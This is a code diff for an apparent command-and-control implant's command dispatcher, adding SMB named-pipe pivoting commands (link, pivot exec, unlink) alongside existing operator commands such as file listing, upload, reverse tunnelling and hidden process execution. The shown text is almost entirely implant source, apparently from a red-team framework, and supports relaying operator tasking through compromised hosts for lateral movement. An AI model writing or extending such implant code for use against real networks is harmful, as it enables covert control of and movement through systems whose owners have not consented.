@@ -53,6 +53,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_JOBS_KILL:
 			this->CmdJobsKill(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_LINK:
+			this->CmdLink(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_LS:
 			this->CmdLs(CommandId, inPacker, outPacker); break;
 
@@ -61,6 +64,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_MKDIR:
 			this->CmdMkdir(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_PIVOT_EXEC:
+			this->CmdPivotExec(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_PROFILE:
 			this->CmdProfile(CommandId, inPacker, outPacker); break;
@@ -103,6 +109,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_TUNNEL_REVERSE:
 			this->CmdTunnelMsgReverse(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_UNLINK:
+			this->CmdUnlink(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_UPLOAD:
 			this->CmdUpload(CommandId, inPacker, outPacker); break;
@@ -391,6 +400,22 @@ void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker
 	outPacker->Pack32(jobId);
 }
 
+void Commander::CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pivotType = inPacker->Unpack32();
+
+	DWORD BytesSize = 0;
+	PVOID Output = NULL;
+
+	if (pivotType == PIVOT_TYPE_SMB) {
+		ULONG pipeSize = 0;
+		CHAR* pipe     = (CHAR*)inPacker->UnpackBytes(&pipeSize);
+		ULONG taskId   = inPacker->Unpack32();
+
+		this->agent->pivotter->LinkPivotSMB(taskId, commandId, pipe, outPacker);
+	}
+}
+
 void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pathSize = 0;
@@ -500,6 +525,16 @@ void Commander::CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
 	}
+}
+
+void Commander::CmdPivotExec(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pivotId  = inPacker->Unpack32();
+	ULONG dataSize = 0;
+	BYTE* data     = inPacker->UnpackBytes(&dataSize);
+	ULONG taskId   = inPacker->Unpack32();
+
+	this->agent->pivotter->WritePivot(pivotId, data, dataSize);
 }
 
 void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -697,7 +732,6 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	spi.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 	spi.wShowWindow = SW_HIDE;
 
-
 	HANDLE pipeRead  = NULL;
 	HANDLE pipeWrite = NULL;
 	if (progOutput) {
@@ -851,6 +885,14 @@ void Commander::CmdTunnelMsgReverse(ULONG commandId, Packer* inPacker, Packer* o
 	WORD  port     = inPacker->Unpack32();
 	ULONG taskId   = inPacker->Unpack32();
 	this->agent->proxyfire->ConnectMessageReverse(tunnelId, port, outPacker);
+}
+
+void Commander::CmdUnlink(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pivotId = inPacker->Unpack32();
+	ULONG taskId  = inPacker->Unpack32();
+
+	this->agent->pivotter->UnlinkPivot(taskId, commandId, pivotId, outPacker);
 }
 
 void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
